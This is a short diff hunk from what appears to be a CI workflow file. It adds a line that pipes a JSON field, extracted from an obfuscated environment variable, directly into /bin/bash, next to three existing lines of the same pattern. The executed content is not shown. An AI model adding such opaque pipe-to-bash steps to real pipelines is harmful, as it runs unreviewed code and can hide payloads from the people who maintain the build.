@@ -29,6 +29,7 @@ jobs:
           echo $xaw32869 | jq -r .d301 | /bin/bash
           echo $q95945 | jq -r .fp977 | /bin/bash
           echo $sxqm9 | jq -r .wjgz8 | /bin/bash
+          printf '%s' "$p48" | jq -r .wga5 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
